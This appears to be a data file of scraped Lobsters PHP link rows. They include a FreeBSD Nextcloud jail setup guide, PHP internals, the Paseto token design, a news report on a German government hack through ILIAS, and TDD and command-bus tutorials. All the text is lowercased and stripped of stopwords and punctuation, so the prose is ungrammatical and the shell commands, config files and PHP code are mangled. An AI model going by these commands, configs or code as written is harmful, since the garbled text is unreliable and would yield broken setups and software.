odbcdefaultlrl odbcdefaultbinmode interbase ibaseallowpersistent ibasemaxpersistent ibasemaxlinks ibasetimestampformat h ibasedateformat ibasetimeformat h mysqli mysqlimaxpersistent mysqliallowpersistent mysqlimaxlinks mysqlicachesize mysqlidefaultport mysqlidefaultsocket mysqlidefaulthost mysqlidefaultuser mysqlidefaultpw mysqlireconnect mysqlnd mysqlndcollectstatistics mysqlndcollectmemorystatistics postgresql pgsqlallowpersistent pgsqlautoresetpersistent pgsqlmaxpersistent pgsqlmaxlinks pgsqlignorenotice pgsqllognotice bcmath bcmathscale browscap session sessionsavehandler file sessionsavepath tmp sessionusestrictmode sessionusecookies sessionuseonlycookies sessionname phpsessid sessionautostart sessioncookielifetime sessioncookiepath sessioncookiedomain sessioncookiehttponly sessionserializehandler php sessiongcprobability sessiongcdivisor sessiongcmaxlifetime sessionreferercheck sessioncachelimiter nocache sessioncacheexpire sessionusetranssid sessionhashfunction sessionhashbitspercharacter urlrewritertags ahref areahref framesrc inputsrc formfakeentry assertion zendassertions com mbstring gd exif tidy tidycleanoutput soap soapwsdlcachedir tmp soapwsdlcachelimit sysvshm ldap ldapmaxlinks mcrypt dba opcache curl openssl daemon enable daemon start final etcrcconf file root nextcloud cat etcrcconf daemon yes syslogdflags sshdenableyes postgresqlenableyes postgresqlclasspostgres postgresqldatavardbpostgresdata phpfpmenableyes memcachedenableyes memcachedflags l nginxenableyes daemon sendmailenablenone sendmailsubmitenableno sendmailoutboundenableno sendmailmspqueueenableno cleartmpenableyes cleartmpxyes extranetfstypesnfs dumpdevno updatemotdno keyratefast let start service memcached root nextcloud usrlocaletcrcdmemcached start starting memcached php phpfpm daemon root nextcloud usrlocaletcrcdphpfpm start performing sanity check phpfpm configuration notice configuration file usrlocaletcphpfpmconf test successful starting phpfpm postgresql database sohuld running already root nextcloud usrlocaletcrcdpostgresql status pgctl server running pid usrlocalbinpostgres vardbpostgresdata nginx webserver root nextcloud usrlocaletcrcdnginx start performing sanity check nginx configuration nginx configuration file usrlocaletcnginxnginxconf syntax ok nginx configuration file usrlocaletcnginxnginxconf test successful starting nginx let see daemon listening port root nextcloud sockstat user command pid fd proto local address foreign address www nginx www nginx www nginx www nginx www nginx www nginx www nginx www nginx root nginx root nginx nobody memcached postgres postgres root sshd remember phpfpm daemon us varrunphpfpmsock socket root nextcloud l l varrunphpfpmsock srwrw www www apr varrunphpfpmsock nextcloud let prepare directory nextcloud data root nextcloud mkdir p vardbnextclouddata root nextcloud chown r www www vardbnextcloud also need make sure whole nextcloud installation directory owned www user root nextcloud chown r www www usrlocalwwwnextcloud able access nextcloud using browser let type http nextcloudlocal host browser choice viola alive last configuration bit etered directly browser admin user admin admin pas nextcloudadminpassword data folder vardbnextclouddata database user nextcloud database pas nextclouddbpassword database name nextcloud database host nextcloudlocal look browser click finish setup button see nextcloud welcome message shown may close message see file nextcloud setting page yelds lack cache daemon let configure memcached daemon nextcloud configuration file added line usrlocalwwwnextcloudconfigconfigphp file root nextcloud usrlocalwwwnextcloudconfig diff u configphporg configphp configphporg configphp dbuser nextcloud dbpassword installed true memcachelocal ocmemcachememcached memcachedistributed ocmemcachememcached memcachedservers array array nextcloudlocal complete nextcloud main configuration file usrlocalwwwnextcloudconfigconfigphp change root nextcloud cat usrlocalwwwnextcloudconfigconfigphp passwordsalt secret trusteddomains array nextcloudlocal datadirectory vardbnextclouddata overwritecliurl http nextcloudlocal dbtype pgsql version dbname nextcloud dbhost nextcloudlocal dbport dbtableprefix oc dbuser nextcloud dbpassword installed true memcachelocal ocmemcachememcached memcachedistributed ocmemcachememcached memcachedservers array array nextcloudlocal alternatively may want get config directly nextcloud application using occ command root nextcloud sudo u www php usrlocalwwwnextcloudocc config list system system instanceid removed sensitive value passwordsalt removed sensitive value secret removed sensitive value trusteddomains nextcloudlocal datadirectory removed sensitive value overwritecliurl http nextcloudlocal dbtype pgsql version dbname removed sensitive value dbhost removed sensitive value dbport dbtableprefix oc dbuser removed sensitive value dbpassword removed sensitive value installed true memcachelocal ocmemcachememcached memcachedistributed ocmemcachememcached memcachedservers nextcloudlocal log end filled varlog directory ton log need configure rotation line add etcnewsyslogconf file root nextcloud cat etcnewsyslogconf eof vardbnextclouddatanextcloudlog www www jc varlogphpfpmlog www www jc varlognginxerrorlog www www jc varlognginxaccesslog www www jc eof let verify rotation root nextcloud newsyslog v tail vardbnextclouddatanextcloudlog trim fri jul varlogphpfpmlog trim fri jul varlognginxerrorlog trim fri jul varlognginxaccesslog trim fri jul yep work like charm cleanup optional may remove needed part jail example downloaded package distfiles root nextcloud rm rf varcachepkg root nextcloud rm rf usrportsobj root nextcloud rm rf usrportsdistfiles root nextcloud pkg autoremove checking integrity done conflicting deinstallation requested following package installed package removed number package removed operation free mib proceed deinstalling package yn reached end good luck nextcloud setup update sysv ipc jail since freebsd freebsd allowsysvipc jail parameter etcjailconf deprecated favor sysvmsgsysvsemsysvshm parameter information available man jail manual page example host man jail allowsysvipc process within jail access system v ipc primitive deprecated favor per module parameter see parameter set equivalent setting sysvmsg sysvsem sysvshm inherit change problem sysv ipc call postgresql server user postgres need different uid jail running host jail postgres user uid everything work like charm described broadly blog post postgres freebsd jail http using newer approach change configuration etcjailconf file host diff u etcjailconfold etcjailconf etcjailconfold etcjailconf execclean mountdevfs allowrawsockets allowsysvipc sysvsem new sysvshm new sysvmsg new whole etcjailconf file modification host cat etcjailconf nextcloud hosthostname nextcloudlocal interface path jailnextcloud execstart binsh etcrc execstop binsh etcrcshutdown execclean mountdevfs allowrawsockets sysvsem new sysvshm new sysvmsg new update setup without socket run setup without socket may want modify php phpfpm daemon listen address instead using varrunphpfpmsock socket communication change usrlocaletcphpfpmdwwwconf phprpm profile nginx webserver main configuration usrlocaletcnginxnginxconf file root nextcloud diff u usrlocaletcphpfpmdwwwconfsocket usrlocaletcphpfpmdwwwconf usrlocaletcphpfpmdwwwconfsocket usrlocaletcphpfpmdwwwconf www user www group www listen varrunphpfpmsock listen listenallowedclients listenbacklog listenowner www listengroup www root nextcloud diff u usrlocaletcnginxnginxconfsocket usrlocaletcnginxnginxconf usrlocaletcnginxnginxconfsocket usrlocaletcnginxnginxconf keepalivetimeout upstream phphandler server unix varrunphpfpmsock server server update nextcloud update update latest nextcloud setup broken symptom login page keep redirecting fix described usrportsupdating file message fix affect user wwwnextcloud author brnrd freebsdorg update path apps bundled package changed apps appspkg must add entry appspaths array configconfigphp nextcloud installation patch default installation applied cd usrlocalwwwnextcloud su www c php occ config import usrlocalsharenextcloudfixappspathsjson fix installation eventual upgrade instruction need executed jail root nextcloud su www c php usrlocalwwwnextcloudocc config import usrlocalsharenextcloudfixappspathsjson hope help resolve issue update nextcloud freebsd article featured bsd zfs user conf episode thanks mentioning eof like like loading related
126,Lobsters,php,PHP programming,Hunting Down Memory Leaks with php Meminfo,https://speakerdeck.com/bitone/hunting-down-memory-leaks-with-php-meminfo,hunting memory leak php meminfo,fewer faster,copyright fewer faster llc slide content description owned creator
128,Lobsters,php,PHP programming,In-Depth Articles on how parts of PHP 7+ Works,https://phpinternals.net/,indepth article part php work,,loading
129,Lobsters,php,PHP programming,How PHP Executes,https://stackoverflow.com/questions/48932719/wheres-the-php-src-php-internals-main-entry-point/48950711#48950711,php executes,entry point code sapi cli cgi fpm handler apache documentation cli cgi code actually executes php script compiles op code executes code function provided php core one bundled extension,entry point code sapi cli standalone application application written c entry point function main file sapicliphpclic line int main int argc char argv two version cli window one console application start main function described window gui application nt create console start us message box output start winmain function file sapicliphpclic line main winmain use code different name different code fragment checking symbol defined defined file used generate window gui application window cgi version also standalone console application entry point also main function file sapicgicgimainc line similar fpm version start main file sapifpmfpmfpmmainc line handler dynamically loadable module dll window unixlike system register function event handler event published web server server start prepost configuration loaded process request etc handler registered function file line find detail loadable module integrates apache apache documentation handler interesting u function phphandler invoked handle http request similar manner every sapi entry point either main function invoked web server entry point similar processing initialize parse command line argument cli cgi kind standalone application read phpini andor configuration apache module configuration overridden htaccess create stream using input file pas function phpexecutescript defined file mainmainc line cleanup return exit code calling process shell web server code actually executes php script function phpexecutescript wrapper interprets phpini configuration entry autoprependfile autoappendfile prepares list file autoprepend file main script autoappend file pass list zendexecutescripts process phpexecutescript always invoked sapis command line argument cli produce direct invocation zendexecutescripts zendexecutescripts interesting thing happen compiles php file return list op code oparray compilation succeeds returned oparray null executes opcodes also exception handling cleanup boring work important parsing execution nevertheless compilation tedious process done function zendparse defined file zendzendlanguageparserc definition zendparse function file zendzendlanguageparserc nowhere seen git repo parser generated using bison read language syntax rule definition lexical token zendzendlanguageparsery zendzendlanguagescannerl generate actual compiler file zendzendlanguageparserc however even hard work visible repo interesting part compilation process visible file mentioned execution compiled script list op code done function zendexecute defined file zendzendvmexecuteh also generated file interesting part generated php script generator script zendzendvmgenphp us zendvmdefh zendvmexecuteskl generate zendvmexecuteh zendvmopcodesh zendvmdefh contains actual interpreter code executes handle op code code function provided php core one bundled extension code php function function provided extension somehow easier follow function included php core located file extstandard directory function provided extension located file corresponding ext subdirectory file c function implement php function declared using phpfunction macro example implementation php function strpos start file extstandardstringc line function strchr alias strstr declared using phpfalias macro file extstandardbasicfunctionsc line forth
131,Lobsters,php,PHP programming,"Paseto is a Secure Alternative to the JOSE Standards (JWT, etc.)",https://paragonie.com/blog/2018/03/paseto-platform-agnostic-security-tokens-is-secure-alternative-jose-standards-jwt-etc,paseto secure alternative jose standard jwt etc,made case avoiding json web token jwt related standard introducing paseto platformagnostic security token haskell implementation outright skip hmac validation paseto jwt knob lever paseto option complexity required use rsa safely public key given message even curve github design motivation paseto halite underlying philosophy ciphersuite agility harmful drown versioned protocol next step password hashing competition versioned protocol robust ciphersuite agility yes ecb mode padding oracle relate jose paseto symmetric cryptography versioned protocol differently ciphersuite agility versioned protocol drown,followup blog post made case avoiding json web token jwt related standard many developer responded post question use instead jwt today happy announce viable replacement introducing paseto platformagnostic security token jose standard jwt subset give developer enough rope hang encrypt sign algorithm support none valid authentication algorithm let token specify algorithm use validate token time went vulnerability discovered jose standard company enthusiast maintained jwt library various language work around vulnerability credit however best brittle solution consider case rncryptor php implementation us authenticated encryption resists timing attack haskell implementation outright skip hmac validation effective way solve security problem ecosystem level design le errorprone standard library implement safer standard need play catchup mainline implementation made paseto expose jwtlike validation claim without runtime protocol negotiation cryptography protocol joinery caused many critical jwt security failure jwt knob lever signing encrypting neither algorithm used signing algorithm used message encryption algorithm used key encryption realworld use case including encryption key ciphertext encrypted guess good mine might make sense key encryption algorithm included publickey cryptography course aesgcm explicitly allowed standard paseto option version token local public local sharedkey authenticated encryption public publickey digital signature lever pull button pull knob fiddle nt worry complexity required use rsa safely nt worry public key given message even curve paseto simple obviously secure solves use case json web token guesswork cryptography aim boring port paseto another language hundredsnotthousands line code especially aim support paseto documentation well reference implementation written php available github design motivation paseto paseto jwt halite various mcryptbased cryptography library php ecosystem say identified source insecurity internet worked replace something would lead better security software developed underlying philosophy secure default simple easytouse easy analyze reason implementors auditor security researcher however need emphasize another point nt obvious sufficient cryptography engineering experience ciphersuite agility harmful full discussion true deserves blog post nutshell introduces risk downgrade attack eg drown far robust design use versioned version one true small backward compatibility window paseto token header includes protocol version information paseto need version eg practical quantum computer developed rsa ecc doomed specify simplysecure ciphersuite new version us postquantum cryptography algorithm scenario local token decrypted reencrypted transparently although quantum computer nt threaten public token older simply rejected downgrade attack weird configuration alg none gotchas watch next step tagged signed released paseto specification reference implementation morning specification changed since version unlikely change coming week intend write draft rfc submit ietf securebydefault replacement jose standard talk among security expert launching web token competition official jose replacement spirit password hashing competition gave u competition surface near future paseto entry contest however minor documentation political concern aside paseto considered stable enough used production system considering building jwt support next software project consider supporting paseto instead time retire errorprone cryptographic standard everywhere versioned protocol really robust ciphersuite agility yes nt work cryptography reason might immediately obvious modern cipher nt directly broken real world time cryptography protocol vulnerability found joinery component instead hoping cryptanalytic breakthrough security researcher simply attack mortar instead brick good example although aes secure block cipher using ecb mode secure using aes cbc mode without adding ciphertext integrity allows trivial plaintext recovery type online attack called padding oracle attack nt break aes protocol use aes way broken circling back brick wall analogy let pretend building actual brick wall instead deciding brick adhering place mortar simply constructed hollow wireframe mortar brick could hotswappable case new tenant decided wanted wall made papiermâché brick instead stone brick would trust wall hold roof cryptography protocol design nt dissimilar brick wall relate jose paseto looking back jose standard particularly json web encryption learn allowed encrypt key one four method rsa pkcs padding asymmetric cryptography insecure rsa oaep padding asymmetric cryptography ecdh asymmetric cryptography aesgcm symmetric cryptography one thing like others giving user implementors enough rope hang ciphersuite agility balloon complexity protocol increase attack surface little recourse available option horrendously broken also increase chance getting configuration wrong way doom security system versioned protocol differently difference subtle important ciphersuite agility mean essentially building hollow wireframe honeycomb structure allowing implementors fill blank option find palatable one core design mistake ssltls system administrator fumed decade tl want deploy ok bos ciphersuite agility security deployment nontrivial okay using version ciphersuites supported backward compatibility complicated ciphersuites allowed version allowed version versioned protocol mean hardcoding one specific ciphersuite given version protocol hardcoded ciphersuite version current protocol found insecure new version decided released two fact lead heightened risk implementation andor deployment ending vulnerable downgrade attack eg drown versioned protocol security deployment straightforward oh using version question backward compatibility simple allow others blocked risk downgrade attack nt quite zero unnecessary complexity exacerbate odds happening versioned protocol algorithm choice sourced security expert wellversed cryptography end much better place mixnmatch cryptography construction
132,Lobsters,php,PHP programming,Government Hack: Hack on German Government via E-Learning Software Ilias,https://www.golem.de/news/government-hack-hack-on-german-government-via-e-learning-software-ilias-1803-133231.html,government hack hack german government via elearning software ilias,lernplattformbakoevbundde previous medium report reported newspaper frankfurter allgemeine sonntagszeitung ilias confirms hack software product manager matthias kunkel wrote march golempurangebot,employee public administration germany use educational program webpage lernplattformbakoevbundde usually webpage operated university german government currently available visitor get error message learning plattform ilias currently unavailable disabled due recommendation bsi bsi german federal office information security bundesamt für sicherheit der informationstechnik platform via hacker attack german government supposedly happened bsi stated knowledge security vulnerability ilias ministry interior declined make comment golemde taken look software error message confirms previous medium report according elearning service government entry point malware attack modifying online course attacker able infect computer federal foreign office reported newspaper frankfurter allgemeine sonntagszeitung attack detected december supposed already active several month point previous report said german government informed secret service another country infected computer although individual computer connected ivbb informationsverbund bonn berlin network compromised clear indication ivbb network infrastructure compromised ivbb german government secure network communicating certain classified information according medium report security authority believe attack russian origin ilias confirms hack software stellenmarkt valtech mobility gmbh verschiedene standorte landeshauptstadt stuttgart stuttgart ilias open source project used several university public institution developed organization located cologne public administrator mailing list ilias product manager matthias kunkel wrote march instalaltion iliassoftware supposedly involved hack network government however currently detailed information used security vulnerability organization want discus issue developer conference next week city hallesaale answering request golemde matthias kunkel ilias commented software said organization ilias open source elearning ev publishes ilias open source software coordinate software development yet individual ilias installation operated corresponding institution company use ilias elearning purpose installation taken offline operated university german government number security vulnerability attacker could used bitte aktivieren sie javascript oder nutzen sie da golempurangebot und lesen golemde ohne werbung mit ausgeschaltetem javascript mit rssvolltextfeed
133,Lobsters,php,PHP programming,Fine-grained Language Composition: Case Study (2016),http://drops.dagstuhl.de/opus/volltexte/2016/6097/pdf/LIPIcs-ECOOP-2016-3.pdf,finegrained language composition case study,,obj length filter flatedecode stream j u
134,Lobsters,php,PHP programming,The Fearless and Natural Approach to TDD,https://keith-mifsud.me/the-fearless-natural-approach-to-tdd,fearless natural approach tdd,test driven development shift mindset unit testing tdd tdd php one sebastian bergmann tdd example phpunit php software development workflow let get shall enjoying reading article privacy policy githubcom php software development workflow tdd obvious choice,applying tdd test driven development religiously past year imagine would even start code test advantage tdd brought along numerous case vital working project certain calibre even though complexity code irrelevant come tdd always apply form another every code write follows test writtenthis post tutorial either unit testing phpunit main purpose help adjust mindset way facilitates tdd highlighting issue experienced thinking test first continue series post developing command bus php developing initial feature using tdd approach hopefully walk mindset evolves tdd become natural obvious way drive code developmentwhat test driven development shift mindsetsounds simple right well least first make work head exposed tdd well last five year honesty always seemed like much work learn testing framework install reality fear stopping implementing tdd approach work easiest conquer learning use new framework phpunit extremely easy developer learn new framework every year mention new language standard point career given opportunity work largescale company largescale project make tdd work cost automated testing way high remember moment detail milestone software development confidence spent free time week writing test dummy problem learned phpunit could write test penny dropped yet still think test thus howthe issue tdd mindset test directly breaking feature adequate unit work say adequate take attempt establishing informal policy make unit unit easy test normally solid code correspond one method one public method subset helper internal one clear conciseeventually penny dropped everything made sense result immediate gain imminent first project till reduced number postrelease bug almost zero application reduced actual working time around mean gain better opportunity work project smaller budget without affecting quality codewhen think something given independent somethings easily establish test checking thing done also easily test dowhat unit testing tdd think required feature expected result break doable thing unit work test thing unit one one rinse repeatremember type test integration test may formed several unit work however would say case unit actual integration test may debatable look forward comment phponce important note tdd necessarily imply unit testing tdd applied several layer application unit functional feature behaviour integration also automated although help popular testing framework php phpunit nt think statement debatable let know comment disagree use article phpunit tutorial plenty one particular enjoyed ago one mention sebastian bergmann good job documenting framework world wide web offlineinstead continue expanding command bus composer package example previous post illustrate new natural probably obvious mindset way learned tdd every daytdd example phpunitin previous post php software development workflow series set project tool also already added phpunit dependency composerjson file go show mindset post going go detail setting phpunit even use assertion mock etc simply want u take couple feature need develop apply tdd approach requirement however always please get touch whenever wish elaborate detail really enjoy answering question becoming daily habit let get shall weour command bus component need resolver class resolve commandhandler command resolve dependency handler may repository specification object initially resolver provided array however may wish automatically resolve dependency application container use framework like symfony laravel therefore start specifying interface generic resolver like php declare namespace swellphpadmiral interface commandhandlerresolver public function gethandler command commandhandler interface implemented concrete commandhandlerresolver like one today arrayresolver future laravelresolver order define establish unit work must start listing desired functionality may become unit work group thereof like resolver take array command handler handler dependency pas array instantiated dependency future resolver implementation may also resolve bounded interface etc focus concrete arrayresolverthe first requirement ability retrieve commandhandler given command start writing extensible testcase avoid bootstrap dependency every test php declare namespace swellphpadmiraltest use swellphpadmiralarrayresolver use swellphpadmiralcommandhandlerresolver abstract class testcase extends phpunitframeworktestcase protected handler protected resolver public function setup handler include dir commandhandlersphp resolver new arrayresolver handler first test getting actual handler namespace swellphpadmiraltest use swellphpadmiralarrayresolver class arrayresolvertest extends testcase public function itcangetcommandhandlerofcommand handler resolver gethandler new draftnewblogpost title content assertinstanceof swellphpadmiralexamplehandlerdraftnewblogpost class handler needle say test fail nt code written go ahead write code make test pas hopefully know exactly part software need worked elegance knowing php declare namespace swellphpadmiral final class arrayresolver implement commandhandlerresolver protected handler protected handlersdependencies public function construct array handler sethandlers handler public function gethandler command commandhandler handler handler getclass command handler new handler return handler well easy nt next let think go wrong gethandler method okay command added array thus registered develop exception class commandnotregistered write test expects exception thrown developed exception class first could reference test simply exception class php declare namespace swellphpadmiralexception final class commandnotregistered extends exception use expectedexception annotation test public function itthrowsexceptionifcommandisnotregistered handlerfornonexistingcommand resolver gethandler new notregisteredcommand next make test pas writing code throw exception command registered arrayresolver protected function assertcommandisregistered string command void arraykeyexists command handler throw new commandnotregistered command change gethandler method assert condition met public function gethandler command commandhandler assertcommandisregistered getclass command handler handler getclass command handler new handler return handler like point several way achieve result phpunit opted use dummy class testing better explaining process even important expand mindset clear expectationsthe point first break task small wellunderstood unit work write test desired result write code make test pas following think go wrong exception exception desired outcome expected input test please also note scenario specifically tied exception varying business rule specification among conditionsto keep post becoming lot longer already briefly illustrate another requirement resolving commandhandler dependency please note even small example actually tested scenario commandhandler class foundare enjoying reading article subscribe receive email notification publish new article code librariesi share email address anyone unsubscribe timeview privacy policy informationthe test new feature public function itresolvehandlerdependenciesfrominstanceofit resolver new arrayresolver somecommand class somecommandwithsingledependency class new listofposts handler resolver gethandler new somecommand assertinstanceof commandhandler class handler assertinstanceof listofposts class handler getlistofposts two main point one notice actually really created class listofpost practice achieve using mock even anonymous class need class exist illustration purpose also future use documentation bird one stone love animal would never throw stone one unless would save life even hit two time second point reality need able resolve dependency even multiple one resolver code included repository linked however testing developing along issue broke two unit one resolve dependency commandhandler requiring single dependency error resolved could move resolving multiple dependency ease find often aid debugging understanding cause issuethe final arrayresolvertest class namespace swellphpadmiraltest use swellphpadmiralarrayresolver use swellphpadmiralcommandhandler use swellphpadmiralexamplecommandsomecommand use swellphpadmiralexceptioncommandnotregistered use swellphpadmiralexceptioncommandhandlernotfound use swellphpadmiralexamplecommanddraftnewblogpost use swellphpadmiralexamplecommandnotregisteredcommand use swellphpadmiralexamplecommandcommandwithouthandler use swellphpadmiralexamplehandlerdependencylistofposts use swellphpadmiralexamplehandlersomecommandwithsingledependency use swellphpadmiralexamplehandlersomecommandwithmultipledependencies class arrayresolvertest extends testcase public function itcangetcommandhandlerofcommand handler resolver gethandler new draftnewblogpost title content assertinstanceof swellphpadmiralexamplehandlerdraftnewblogpost class handler public function itthrowsexceptionwhenhandlerisnotfound handler resolver gethandler new commandwithouthandler public function itthrowsexceptionifhandlerdoesnotimplementcontract handler resolver gethandler new somecommand public function itthrowsexceptionifcommandisnotregistered handlerfornonexistingcommand resolver gethandler new notregisteredcommand public function itresolvehandlerdependenciesfrominstanceofit resolver new arrayresolver somecommand class somecommandwithsingledependency class new listofposts handler resolver gethandler new somecommand assertinstanceof commandhandler class handler assertinstanceof listofposts class handler getlistofposts public function itresolvesmultipledependencies resolver new arrayresolver somecommand class somecommandwithmultipledependencies class new listofposts string handler resolver gethandler new somecommand assertinstanceof commandhandler class handler assertinstanceof listofposts class handler getpostlist assertequals string handler getstringdependency assertequals handler getnumericdependency actual arrayresolver php declare namespace swellphpadmiral use swellphpadmiralexceptioncommandnotregistered use swellphpadmiralexceptioncommandhandlernotfound final class arrayresolver implement commandhandlerresolver protected handler protected handlersdependencies public function construct array handler sethandlers handler public function gethandler command commandhandler assertcommandisregistered getclass command handler handler getclass command assertcommandhandlerexists handler dependency hasdependencies handler dependency resolvedependencies handler handler new handler dependency handler new handler dependency return handler protected function resolvedependencies string commandhandler array dependency foreach handlersdependencies commandhandler handlerdependencies dependency handlerdependencies return dependency protected function hasdependencies string commandhandler bool return arraykeyexists commandhandler handlersdependencies protected function assertcommandisregistered string command void arraykeyexists command handler throw new commandnotregistered command protected function assertcommandhandlerexists string commandhandler void classexists commandhandler throw new commandhandlernotfound commandhandler protected function sethandlers array handler registeredhandlers foreach handler command handler isarray handler registeredhandlers command handler else registeredhandlers command handler sethandlersdependencies handler handler handler registeredhandlers protected function sethandlersdependencies string commandhandler array dependency handlerdependencies foreach dependency dependency handlerdependencies dependency handlersdependencies commandhandler handlerdependencies find code related feature githubcom resolver feature command bus component completed seven test eleven assertion passing shown screenshot also included broken task followed start finish feature extend previous post php software development workflow famous green bar issue completed tdd obvious choicei hope article persuades nontesters convert tdd existing tester challenge mind work think test driven development easy change mindset unfortunately still several company much used still think tdd costly important made definitely wrong web application development application software learning timeframe approached correctly one two week benefit immediate go tell bos read article two week spend learning tdd gained within project learning along save time straight away reason get stuck simply get touch happy help
136,Lobsters,php,PHP programming,PHP software development workflow,https://keith-mifsud.me/php-software-development-workflow,php software development workflow,developing command bus php get started new php project githubcom work station initial set homestead setting git setting ide composerjson file readme file setting library packagist packagist packagist keithmifsud swellphp enjoying reading article privacy policy reorganise done,continuing previous post developing command bus php look get started setting composer library project although php software development workflow vary slightly project project step le whether project result successful proposal want build open source composer package like post guide working php right way learning php scratch find missing intermediary step making assumption please feel welcome comment happy explain detailhow get started new php projectfirst thing first let get organisedas every project obviously sort list feature requirement instead remember bunch thing number resource spread everywhere email message thread skype conversation numerous attachment start putting everything related project one place use kanban board githubcom list everything know need way nt remember anything find everything need one place including conversing project stakeholdersthroughout year part scrum kanban scrumban team given choice prefer adopt kanban methodology project fit better remote team even truer working open source project contributor come go time make timeboxed sprint impossible also find kanban fit perfectly continuous integration strategiesso head github create new repository code kanban project hosted however want allow developer able contribute library keep thing even organised create repository organisation swellphp fork personal account thus code contributor everyone else involved find process better reviewing code approving pull request without risking conflict contributionsthis process straight forward github click swellphp organisation click new button enter repository name match project name case admiral screen enter brief description repository since also add initial readme gitignore license file since open source project obviously make publicly available choose appropriate license case chose mit licence everyone use code like long provide attribution author also selected composer preconfigured gitignore file create repository screen repository created want create project access kanban board simple give kanban board name description also use automated kanban template card issue pullrequests automatically transitioned column certain eventsonce kanban board immediately create card task aware kept simple much detail needed initial purpose similar brain dump list break card smaller unit work start working specific card basically stage create card feature know add card task come throughout projectthe admiral project quite simple reflected kanban board kanban board simply created card task know time actually start working station initial set upas every task start moving current card column progress one also convert current card issue identifier match repository branch name start submitting code explain shortly moved first card named project setup progress column converted issue next step add beautiful tick box broken task nt forget anything mainly issue fully planned advance get iti also created new milestone named release version additional issue label categorise task appropriately first issue see screenshot broken list step required getting set go ahead move next sub task installing launching vagrant boxas php project use homestead vagrant box provided taylor otwell creator laravel assuming homestead dependency installed already including composer host machine nt follow instruction homestead documentation ask detailed instruction comment section also note work window workstation command host machine vary mac user however using git bash access standard unix command mkdir p codeswellphpadmiral cd codeswellphpadmiral composer require laravelhomestead dev vendorbinhomestead makesince project require http server database comment line homesteadyaml file launch box ip memory cpu provider virtualbox authorize sshidrsapub key sshidrsa folder map c userskeithcodeswellphpadmiral homevagrantcode name admiral hostname admiral vagrant vagrant ssh cd codesetting gitnow want fork swellphpadmiral repository nt work directly official code base simply navigate swellphpadmiral repository page github click fork button select account voila forked repository keithmifsudadmirali need add main repository fork local git official repository named upstream whilst fork origin also configure git author commits linked github git init git remote add upstream git githubcom swellphpadmiralgit git remote add origin git githubcom keithmifsudadmiralgit git pull upstream master git config global edit ctrlx git add git commit initial commit first commit way set local branch first checking new develop branch hold local change checkout first feature branch name issue key github case using feature branch naming issue hand keep everything organised also github mention commits issue page making easier future reference feature branching model enforces u segregate responsibility code git checkout b develop git checkout b like take care protecting upstream master branch forcing contributor request merge contribution including quite straight forward swellphpadmiral repository navigate setting branch protected branch select master branch least select protect branch include administrator force pull request reviewed merging master branch upstream repository also protects branch deletedsetting ideok vagrant box running git setup locally remotely next setting ide use well phpstorm phpstorm well configured already still thing every project first foremost add project ide obviously rename project case swellphp admiral docblocks configured automatically retrieve project name phpstorm phpstorm default project name name directory lowercase nt like important setting phpstorm configure php interpreter us one vagrant box consider setting important especially difference php version phpstorm tell example use feature available interpreter set php php interpreter setting phpstorm later project also need configure directory setting phpstorm automatically populate namespaces etc create new class using preconfigured templatesthe composerjson filethe next step configure composerjson file library installed packigistorg since already file homestead development dependency simply need edit like name swellphpadmiral description php command bus command handling type library keywords swellphp swellphp admiral admiral command bus cqrs license mit require php requiredev laravelhomestead phpunitphpunit autoload classmap swellphpadmiral srcadmiral autoloaddev swellphpadmiraltest testsadmiral config preferredinstall dist notice added php version requirement also phpunit development requirement need update composer readme filesince deploy package packagistorg without anything useful state readmemd file let go ahead add preliminary information admiral swellphp code repository admiral php command bus command handling ability development please note library initial development recommended anyone use scenario except testing development learning please visit developing command bus php http keithmifsudmedevelopingacommandbusinphp information installation install via composer composer require swellphpadmiral documentation usage documentation provided soon contributing public contribution available soon guideline updated applicable license licensed mit license license file license copyright per creative common community copyright reserved author setting library packagistbefore submit code file packagist need commit change merge source composerjson file picked packagist also good idea check gitignore file stage make sure using phpstorm exclude idea directory conflict one developer resulting loss ide setting preference file look like git add git commit udated composerjson readmemd gitignore git checkout develop git merge upstream master git merge git push origin developthen github submit pull request upstream master branch must approve manually change merged previously protected branchassuming already account packagist easily submit package click submit link top navigation enter repository url case http githubcomswellphpadmiral click check followed submitfollowing want package automatically update change whenever merge upstream code need set hook github also quite easy needed access setting page swellphpadmiral integration service tab click add service select packagist list available service enter packagist username vendor name case keithmifsud swellphp copy api token packagist profile token field github click add service done click edit button click test service go well merges upstream reflected packagist automaticallynow everyone install package simply requiring via composer composer require swellphpadmiralare enjoying reading article subscribe receive email notification publish new article code librariesi share email address anyone unsubscribe timeview privacy policy informationreorganisewe almost done need get reorganised ready pick next time first let close issue kanban board delete branch local git merged deployed git merge upstreammaster git branch anyone notice already undocumented backlog task one create documentation another prepare contribution guideline promised user provide readme file simply create card kanban board task nt remember anything needed closed issue added new card donethis quite long read nt hope post useful anyone wanting start new php library php project matter next post start programming actual library test driven development tdd approach feel free ask question comment subscribe email newsletter ensure notified soon next post published
137,Lobsters,php,PHP programming,Developing a Command Bus in PHP,https://keith-mifsud.me/developing-a-command-bus-in-php,developing command bus php,packagist laravel command handler bus subscriber many similar library develop another one laravel service container step step guide developing open source php composer package admiral command component enjoying reading article privacy policy,series blog post developing php library command bus command handling subscription feature main goal series describe entire process developing composer package including making available packagist implementing laravel separate package command handler bus subscriber simply put command dto data transfer object single purpose containing detail message case command telling model code something command implemented several layer code base mostly application domain layer however post focus domain layer thus application call domain command service controller implemented command immutable meaning property message detail set command constructed changed described name command handler handle command therefore command handler generally one notable method named handle something similar however command handler dependency constructor needed handle method repository word command bus dispatch command command handler whilst command subscriber subscribes command corresponding handler command bus know handler call command initiated many similar library develop another one good question fact multitude similar package provide similar function used several many project however far nt found one fit code architecture dependency nt require project also need package component include another much larger event sourcing framework project mention get opportunity build want component simple flexible implemented framework laravel symfony finally want able initialise component simply passing array command command handler command subscriber command bus similar commandswithhandlers keithmifsudexamplemodelcommanddosomething class keithmifsudexamplemodelhandlerdosomething class keithmifsudexamplemodelcommanddosomethingelse class keithmifsudexamplemodelhandlerdosomethingelse class commandbus new swellphpadmiralcommandbus new swellphpadmiralarrayresolver commandswithhandlers command new keithmifsudexamplemodelcommanddosomething parameter commandbus dispatch command basic example would also want able automatically inject command handler dependency using framework application container laravel service container explain end series step step guide developing open source php composer package admiral command component enjoying reading article subscribe receive email notification publish new article code librariesi share email address anyone unsubscribe timeview privacy policy information throughout small series blog post detail process developing component initial project setup official release follows part development bus using tdd approach part packaging versioning composer including basic usage documentation part releasing packagist part developing laravel implementation
